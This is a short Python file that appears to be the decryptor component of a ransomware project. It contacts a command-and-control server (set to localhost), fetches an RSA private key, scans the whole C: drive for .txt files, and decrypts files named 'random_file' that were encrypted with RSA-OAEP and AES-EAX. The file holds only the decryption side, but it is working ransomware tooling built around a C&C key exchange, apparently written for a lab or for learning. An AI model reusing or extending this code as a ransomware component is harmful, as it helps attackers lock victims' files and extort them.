import os
import socket
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES



# Macros for Connection with C&C Server
IP_ADDRESS = '127.0.0.1'
PORT = 5678

# get_files grabs all the files from C:\ that have extension in encrypted_extensions
def get_files(encrypted_extensions):
    file_paths = []
    for root, dirs, files in os.walk('C:\\'):
        for file in files:
            file_path, file_extension = os.path.splitext(root+'\\'+file)
            if file_extension in encrypted_extensions:
                file_paths.append(root+'\\'+file)
    return file_paths

def decrypt(dataFile, private_key_file):
    with open(private_key_file, 'rb') as file:
        private_key = file.read()
        key = RSA.import_key(private_key)

    with open(dataFile, 'rb') as file:
        encryptedSessionKey, nonce, tag, ciphertext = [ file.read(x) for x in (key.size_in_bytes(), 16, 16, -1) ]

    cipher = PKCS1_OAEP.new(key)
    sessionKey = cipher.decrypt(encryptedSessionKey)

    cipher = AES.new(sessionKey, AES.MODE_EAX, nonce)
    data = cipher.decrypt_and_verify(ciphertext, tag)

    with open(dataFile, 'wb') as file:
        file.write(data)
    
    print('Done Decpyting: ' + dataFile)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((IP_ADDRESS, PORT))
    s.send('private_key required!'.encode())
    private_key = s.recv(2048)
    with open('private_key.pem', 'wb') as f:
        f.write(private_key)
    s.close()

encrypted_extensions = ('.txt',) # all the extensions that will be decrypted

file_paths = get_files(encrypted_extensions)

for file in file_paths:
    if 'random_file' in file:
        decrypt(file, 'private_key.pem')